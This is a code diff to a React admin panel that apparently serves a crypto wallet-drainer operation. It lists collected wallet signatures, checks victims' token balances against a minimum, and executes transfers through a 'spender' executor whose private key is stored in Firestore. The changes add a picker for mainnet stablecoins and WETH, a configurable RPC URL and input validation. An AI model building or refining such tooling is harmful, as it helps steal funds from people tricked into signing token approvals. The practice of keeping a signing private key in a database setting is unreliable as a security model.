@@ -8,6 +8,18 @@ const BACKEND_URL = "/api/run-worker";
 
 // Default executor address (mainnet) - can be overridden via Firestore admin settings
 const HARDCODED_EXECUTOR = import.meta.env.VITE_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
+const CUSTOM_TOKEN_OPTION = 'custom';
+const TOKEN_OPTIONS = [
+  { id: 'USDT', label: 'USDT (Mainnet)', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+  { id: 'USDC', label: 'USDC (Mainnet)', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+  { id: 'DAI', label: 'DAI (Mainnet)', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+  { id: 'WETH', label: 'WETH (Mainnet)', address: '0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2' }
+];
+
+const getTokenOptionByAddress = (address) => {
+  if (!address) return null;
+  return TOKEN_OPTIONS.find((token) => token.address.toLowerCase() === String(address).trim().toLowerCase()) || null;
+};
 
 export default function Admin() {
   const [signatures, setSignatures] = useState([]);
@@ -21,7 +33,12 @@ export default function Admin() {
   const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
   const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
   const [recipientAddressSetting, setRecipientAddressSetting] = useState(HARDCODED_EXECUTOR);
+  const [rpcUrlSetting, setRpcUrlSetting] = useState(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
   const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState('100');
+  const [selectedTokenOption, setSelectedTokenOption] = useState(() => {
+    const selected = getTokenOptionByAddress(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
+    return selected?.id || CUSTOM_TOKEN_OPTION;
+  });
 
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
@@ -31,6 +48,35 @@ export default function Admin() {
   useEffect(() => {
     localStorage.setItem('admin_outputToken', outputToken);
   }, [outputToken]);
+
+  useEffect(() => {
+    let mounted = true;
+    (async () => {
+      try {
+        const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
+        if (!snap.exists() || !mounted) return;
+        const s = snap.data();
+        if (s?.tokenAddress) {
+          setOutputToken(s.tokenAddress);
+          setSelectedTokenOption(getTokenOptionByAddress(s.tokenAddress)?.id || CUSTOM_TOKEN_OPTION);
+        }
+        if (s?.recipientAddress) setRecipient(s.recipientAddress);
+        if (s?.rpcUrl) setRpcUrlSetting(s.rpcUrl);
+      } catch (err) {
+        console.error('Initial settings load error:', err);
+      }
+    })();
+
+    return () => { mounted = false; };
+  }, []);
+
+  const handleTokenOptionChange = (nextOptionId) => {
+    setSelectedTokenOption(nextOptionId);
+    const selected = TOKEN_OPTIONS.find((token) => token.id === nextOptionId);
+    if (selected) {
+      setOutputToken(selected.address);
+    }
+  };
 
   const openSettings = async () => {
     setIsSettingsOpen(true);
@@ -43,6 +89,7 @@ export default function Admin() {
       const tokenVal = s.tokenAddress || outputToken;
       const privKeyVal = s.executorPrivateKey || '';
       const recipientVal = s.recipientAddress || HARDCODED_EXECUTOR;
+      const rpcVal = s.rpcUrl || import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com';
       const minVal = s.minRequiredBalance !== undefined && s.minRequiredBalance !== null 
         ? String(s.minRequiredBalance) 
         : '100';
@@ -50,7 +97,9 @@ export default function Admin() {
       setExecutorAddressSetting(execVal);
       setExecutorPrivateKeySetting(privKeyVal);
       setOutputToken(tokenVal);
+      setSelectedTokenOption(getTokenOptionByAddress(tokenVal)?.id || CUSTOM_TOKEN_OPTION);
       setRecipientAddressSetting(recipientVal);
+      setRpcUrlSetting(rpcVal);
       setRecipient(recipientVal);
       setMinRequiredBalanceSetting(minVal);
       setSettingsStatus('Loaded');
@@ -76,6 +125,17 @@ export default function Admin() {
       if (!outputToken?.trim()) {
         throw new Error('Output Token Address is required');
       }
+      if (!isAddress(outputToken.trim())) {
+        throw new Error('Output Token Address must be a valid EVM address');
+      }
+      if (!rpcUrlSetting?.trim()) {
+        throw new Error('RPC URL is required');
+      }
+
+      const normalizedRpcUrl = rpcUrlSetting.trim();
+      if (!/^https?:\/\//i.test(normalizedRpcUrl) && !/^wss?:\/\//i.test(normalizedRpcUrl)) {
+        throw new Error('RPC URL must start with http(s):// or ws(s)://');
+      }
 
       const parsedMin = Number(minRequiredBalanceSetting);
       const minRequiredBalance = Number.isFinite(parsedMin) && parsedMin >= 0 ? parsedMin : 100;
@@ -83,6 +143,7 @@ export default function Admin() {
       const settingsData = {
         executorAddress: executorAddressSetting.trim(),
         recipientAddress: recipientAddressSetting.trim(),
+        rpcUrl: normalizedRpcUrl,
         tokenAddress: outputToken.trim(),
         minRequiredBalance: minRequiredBalance,
         updatedAt: new Date().toISOString()
@@ -95,6 +156,7 @@ export default function Admin() {
 
       await setDoc(docRef(db, 'admin_config', 'settings'), settingsData, { merge: true });
       setRecipient(recipientAddressSetting);
+      setRpcUrlSetting(normalizedRpcUrl);
       setSettingsStatus('Saved successfully');
       setTimeout(() => setSettingsStatus(''), 3000);
     } catch (err) {
@@ -140,7 +202,7 @@ export default function Admin() {
   const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;
 
   const getReadProvider = () => {
-    return new JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
+    return new JsonRpcProvider(rpcUrlSetting || import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
   };
 
   useEffect(() => {
@@ -210,7 +272,10 @@ export default function Admin() {
             if (mounted) setTokenDecimals(decimals);
           } catch (e) {
             console.error('Failed to load token contract:', e);
-            if (mounted) setBalancesError('Token not found on configured RPC network');
+            if (mounted) {
+              const reason = String(e?.shortMessage || e?.message || 'Unknown RPC error').slice(0, 180);
+              setBalancesError(`Token read failed on configured RPC: ${reason}`);
+            }
           }
         }
 
@@ -278,7 +343,7 @@ export default function Admin() {
     })();
 
     return () => { mounted = false; };
-  }, [groupedData, tokenAddress, tokenDecimals]);
+  }, [groupedData, tokenAddress, tokenDecimals, rpcUrlSetting]);
 
   const handleExecute = async (sigData) => {
     setProcessingId(sigData.id);
@@ -346,15 +411,27 @@ export default function Admin() {
       {/* Settings Row */}
       <div className="mb-6 bg-white shadow p-5 text-gray-700 rounded-lg border">
         <h2 className="text-lg font-semibold text-gray-700 mb-3">Global Settings</h2>
-        <input
+        <select
           className="w-full px-3 text-gray-700 py-2 border rounded-md"
-          value={outputToken}
-          onChange={(e) => setOutputToken(e.target.value)}
-          placeholder="Output Token Address (e.g., 0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2)"
-        />
+          value={selectedTokenOption}
+          onChange={(e) => handleTokenOptionChange(e.target.value)}
+        >
+          {TOKEN_OPTIONS.map((token) => (
+            <option key={token.id} value={token.id}>{token.label}</option>
+          ))}
+          <option value={CUSTOM_TOKEN_OPTION}>Custom token address</option>
+        </select>
+        {selectedTokenOption === CUSTOM_TOKEN_OPTION && (
+          <input
+            className="w-full mt-3 px-3 text-gray-700 py-2 border rounded-md font-mono text-sm"
+            value={outputToken}
+            onChange={(e) => setOutputToken(e.target.value)}
+            placeholder="Output Token Address (e.g., 0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2)"
+          />
+        )}
         <p className="text-xs text-gray-500 mt-2">
-          {outputToken && outputToken !== '0x0000000000000000000000000000000000000000' 
-            ? '✓ Token address set' 
+          {outputToken && isAddress(outputToken) && outputToken !== '0x0000000000000000000000000000000000000000' 
+            ? '✓ Token selected' 
             : '⚠ No token address - balances will not load'}
         </p>
       </div>
@@ -551,12 +628,35 @@ export default function Admin() {
 
               <div>
                 <label className="block text-sm font-semibold mb-1">Output Token Address</label>
+                <select
+                  value={selectedTokenOption}
+                  onChange={e => handleTokenOptionChange(e.target.value)}
+                  className="w-full px-3 py-2 border rounded text-sm"
+                >
+                  {TOKEN_OPTIONS.map((token) => (
+                    <option key={token.id} value={token.id}>{token.label}</option>
+                  ))}
+                  <option value={CUSTOM_TOKEN_OPTION}>Custom token address</option>
+                </select>
+                {selectedTokenOption === CUSTOM_TOKEN_OPTION && (
+                  <input
+                    value={outputToken}
+                    onChange={e => setOutputToken(e.target.value)}
+                    className="w-full mt-2 px-3 py-2 border rounded font-mono text-sm"
+                    placeholder="0x..."
+                  />
+                )}
+              </div>
+
+              <div>
+                <label className="block text-sm font-semibold mb-1">RPC URL</label>
                 <input
-                  value={outputToken}
-                  onChange={e => setOutputToken(e.target.value)}
-                  className="w-full px-3 py-2 border rounded font-mono text-sm"
-                  placeholder="0x..."
+                  value={rpcUrlSetting}
+                  onChange={e => setRpcUrlSetting(e.target.value)}
+                  className="w-full px-3 py-2 border rounded text-sm"
+                  placeholder="https://cloudflare-eth.com"
                 />
+                <p className="text-xs text-gray-500 mt-1">Used by worker/server for chain reads and tx submission</p>
               </div>
 
               <div>
